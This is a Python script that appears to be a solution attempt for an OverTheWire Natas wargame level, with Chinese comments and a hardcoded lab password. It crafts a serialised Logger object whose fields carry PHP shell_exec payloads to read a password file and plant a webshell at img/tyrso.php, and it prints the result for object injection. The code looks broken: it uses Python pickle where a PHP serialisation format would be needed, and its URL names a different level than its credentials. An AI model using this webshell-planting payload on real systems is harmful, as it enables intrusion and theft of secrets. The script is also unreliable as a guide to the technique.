import requests
from requests.auth import HTTPBasicAuth
import pickle
import base64

ps26 = 'cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE'
user = 'natas26'
basicAuth = HTTPBasicAuth(user, ps26)
url = "http://natas25.natas.labs.overthewire.org/"

class Logger:
    def __init__(self):
        self.initMsg = '<?php echo shell_exec("cat /etc/natas_webpass/natas27"); ?>'
        self.exitMsg = '<?php echo shell_exec("cat /etc/natas_webpass/natas27"); ?>'
        self.logFile = 'img/tyrso.php'

tmp = Logger()

# 序列化 Logger 對象
serialized_logger = pickle.dumps(tmp)

# Base64 編碼
encoded_logger = base64.b64encode(serialized_logger)

# 將編碼數據轉換為字符串
encoded_str = encoded_logger.decode('utf-8')
print("Encoded Logger:", encoded_str)